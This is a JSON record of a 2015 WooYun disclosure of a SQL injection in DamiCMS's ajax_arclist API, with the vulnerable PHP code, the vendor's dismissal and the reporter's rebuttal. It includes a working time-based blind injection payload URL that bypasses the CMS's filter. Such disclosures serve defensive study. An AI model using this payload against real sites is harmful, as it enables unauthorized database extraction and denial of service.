{"id": 34477, "wybug_id": "wooyun-2015-0106310", "wybug_title": "大米CMS最新版一个参数引发多处sql注入， 绕过防御(附验证脚本)", "wybug_corp": "damicms.com", "wybug_author": "izy", "wybug_date": "2015-04-09 10:28", "wybug_open_date": "2015-07-09 07:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向公众公开  简要描述： 过滤不严 详细说明：  出现注入的地方是在ApiAction.class.php文件ajax_arclist函数\nfunction ajax_arclist(){$prefix = !empty($_REQUEST['prefix'])?(bool)$_REQUEST['prefix']:true;\t\t //表过滤防止泄露信息,只允许的表\t\t if(!in_array($_REQUEST['model'],array('article','type','ad','label','link'))){exit();}\t\t if(!empty($_REQUEST['model'])){\t\t if($prefix == true){\t\t $model = C('DB_PREFIX').$_REQUEST['model'];\t\t }\t\t else{\t\t$model =\t$_REQUEST['model'];\t\t } \t\t }else{\t\t$model = C('DB_PREFIX').'article';\t\t }           $order     =!empty($_REQUEST['order'])?inject_check($_REQUEST['order']):'';         $num       =!empty($_REQUEST['num'])?inject_check($_REQUEST['num']):'';         $where     =!empty($_REQUEST['where'])?inject_check(urldecode($_REQUEST['where'])):'';                  //使where支持 条件判断,添加不等于的判断         $page=false;         if(!empty($_REQUEST['page'])) $page=(bool)$_REQUEST['page'];             $pagesize  =!empty($_REQUEST['pagesize'])?intval($_REQUEST['pagesize']):'10';         //$query     =!empty($_REQUEST['sql'])?$_REQUEST['sql']:'';//太危险不用         $field     = '';\t\t if(!empty($_REQUEST['field'])){\t\t $f_t = explode(',',inject_check($_REQUEST['field']));\t\t $f_t = array_map('urlencode',$f_t);\t\t $field = implode(',',$f_t);\t\t }\t         $m=new Model($model,\"\",false);\t          //如果使用了分页,缓存也不生效         if($page){               import(\"@.ORG.Page\");     //这里改成你的Page类                         $count=$m->where($where)->count();              var_dump($count);exit();              $total_page = ceil($count / $pagesize);              $p = new Page($count,$pagesize);               //如果使用了分页，num将不起作用               $t=$m->field($field)->where($where)->limit($p->firstRow.','.$p->listRows)->order($order)->select();\t\t\t   //echo $m->getLastSql();\t\t\t   \t\t\t   $ret = array('total_page'=>$total_page,'data'=>$t);\t\t\t            }         //如果没有使用分页，并且没有 query         if(!$page){             $ret=$m->field($field)->where($where)->order($order)->limit($num)->select();         }\t\t          $this->ajaxReturn($ret,'返回信息',1);\t\t }\n看到这几行代码，where参数全都可以注入：\n$count=$m->where($where)->count();               $t=$m->field($field)->where($where)->limit($p->firstRow.','.$p->listRows)->order($order)->select();         $ret=$m->field($field)->where($where)->order($order)->limit($num)->select();\n在where条件中，字符串是不做处理的，导致sql漏洞产生全局有一个php_safe.php过滤,但是我们还可以继续绕过.具体paylaod:http://127.0.0.1/dami/index.php?s=api/ajax_arclist&model=ad&page=1&where=11%26%26if(ascii(substr(database(),4,1))=105 ,sleep(1),1)#官网测试，以为会查询4次所以延迟了4秒：\n\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 izy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-09 07:56 厂商回复： 这个其实已经考虑到了 就像执行where条件的1=1 或等待不影响数据，我想更多的了解 您这个注入是如何对大米CMS的数据执行的查询或其他什么操作 漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-10 08:11 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  @damicms.com 数据库的名字不是已经注入出来了吗？脚本都给了…对于大的网站注入不一定需要出数据，还可以dos啊     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}